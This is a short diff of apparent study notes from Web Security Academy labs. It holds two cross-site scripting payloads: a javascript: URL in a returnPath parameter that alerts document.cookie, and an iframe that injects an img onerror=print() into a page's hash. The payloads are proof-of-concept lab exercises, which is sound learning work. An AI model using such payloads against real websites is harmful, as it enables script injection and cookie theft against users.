@@ -26,4 +26,9 @@
 https://0ac400f60339e68c8218abfa00e90020.web-security-academy.net/feedback
 ?returnPath=javascript:alert(document.cookie)
 
+===
+
+// redirect user to website, then perform xss
+// in this case, the payload attempts to print the webpage on the user's computer...
+<iframe src="https://0a37009f040876fb8054089800590050.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
